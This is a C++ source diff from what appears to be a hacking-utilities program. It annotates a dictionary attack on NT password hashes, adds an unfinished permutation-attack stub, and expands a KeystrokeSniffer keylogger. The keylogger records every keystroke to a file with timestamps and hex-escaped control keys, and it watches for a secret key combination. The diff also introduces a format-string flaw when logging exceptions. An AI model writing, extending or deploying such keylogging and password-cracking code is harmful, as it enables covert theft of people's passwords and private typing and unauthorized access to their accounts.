@@ -833,9 +833,9 @@ void dictAttackNTPassword(GArgReader& args)
 	GBits::hexToBufferBigEndian(szHashHex, 32, hash);
 
 	const char* szDictionary = args.pop_string();
-	size_t cap1 = 6;
-	size_t cap2 = 4;
-	size_t cap3 = 3;
+	size_t cap1 = 6; // max length for one-word passphrase attempts
+	size_t cap2 = 4; // max length for two-word passphrase attempts
+	size_t cap3 = 3; // max length for three-word passphrase attempts
 	while(args.next_is_flag())
 	{
 		if(args.if_pop("-cap1"))
@@ -895,6 +895,35 @@ void dictAttackNTPassword(GArgReader& args)
 			dictAttack(hash, &d3, &d1, &d2);
 		}
 	}
+}
+
+void permuteAttack(GArgReader& args)
+{
+	const char* szHashHex = args.pop_string();
+	if(strlen(szHashHex) != 32)
+		throw Ex("Expected the hash to consist of 32 hexadecimal digits");
+	unsigned char hash[16];
+	GBits::hexToBufferBigEndian(szHashHex, 32, hash);
+
+	const char* szBase = args.pop_string();
+	size_t removals = 0;
+	size_t changes = 2;
+	size_t additions = 3;
+	while(args.next_is_flag())
+	{
+		if(args.if_pop("-removals"))
+			throw Ex("Sorry, not supported yet");
+		else if(args.if_pop("-changes"))
+			changes = args.pop_uint();
+		else if(args.if_pop("-additions"))
+			additions = args.pop_uint();
+		else
+			throw Ex("Invalid option: ", args.peek());
+	}
+
+	// todo: finish me
+	
+	
 }
 
 void dump(GArgReader& args)
@@ -1396,6 +1425,8 @@ protected:
 	GKeyboard* m_pKeyboard;
 	FILE* m_pLogFile;
 	int m_nMagicPos;
+	double m_lastKeyTime;
+	char time_buf[64];
 
 public:
 	KeystrokeSniffer(const char* szFilename)
@@ -1404,16 +1435,15 @@ public:
 		m_pLogFile = fopen(szFilename, "a");
 		if(!m_pLogFile)
 			throw "Failed to open log file\n";
-		char buf[64];
-		fprintf(m_pLogFile, "\n== Begin at %s ==\n", GTime::asciiTime(buf, 64, false));
+		fprintf(m_pLogFile, "\n== Begin at %s ==\n", GTime::asciiTime(time_buf, 64, false));
 		m_pKeyboard = new GKeyboard(KeyStrokeHandler, this);
+		m_lastKeyTime = GTime::seconds();
 	}
 
 	~KeystrokeSniffer()
 	{
 		delete(m_pKeyboard);
-		char buf[64];
-		fprintf(m_pLogFile, "\n== End at %s ==\n", GTime::asciiTime(buf, 64, false));
+		fprintf(m_pLogFile, "\n== End at %s ==\n", GTime::asciiTime(time_buf, 64, false));
 		fclose(m_pLogFile);
 	}
 
@@ -1434,9 +1464,32 @@ public:
 
 	void OnKeyStroke(char c)
 	{
-		fputc(c, m_pLogFile);
-		if(rand() % 100 == 0)
+		if(c == '\r')
+			c = '\n';
+		else if(c < 32 || c > 126)
+		{
+			char h1 = (c >> 4) + '0';
+			if(h1 > '9')
+				h1 += ('a' - '0' - 10);
+			char h2 = (c & 15) + '0';
+			if(h2 > '9')
+				h2 += ('a' - '0' - 10);
+			OnKeyStroke('<');
+			OnKeyStroke(h1);
+			OnKeyStroke(h2);
+			OnKeyStroke('>');
+			return;
+		}
+		double d = GTime::seconds();
+		if(d - m_lastKeyTime > 120)
+		{
+			fprintf(m_pLogFile, "\n-- Time %s -\n", GTime::asciiTime(time_buf, 64, false));
+			fputc(c, m_pLogFile);
 			fflush(m_pLogFile);
+		}
+		else
+			fputc(c, m_pLogFile);
+		m_lastKeyTime = d;
 		if(c == g_szMagicCombo[m_nMagicPos])
 		{
 			if(++m_nMagicPos >= MAGIC_LEN)
@@ -1449,14 +1502,20 @@ public:
 	static void doLogging(void* filename)
 	{
 		const char* szFilename = (const char*)filename;
+		KeystrokeSniffer ks(szFilename);
 		try
 		{
-			KeystrokeSniffer ks(szFilename);
 			ks.Watch();
 		}
-		catch(std::exception&)
+		catch(std::exception& e)
 		{
-//			fprintf(stderr, e.what());
+			fprintf(ks.m_pLogFile, "[Exception: ");
+			fprintf(ks.m_pLogFile, e.what());
+			fprintf(ks.m_pLogFile, "]\n");
+		}
+		catch(...)
+		{
+			fprintf(ks.m_pLogFile, "[System Exception]");
 		}
 	}
 
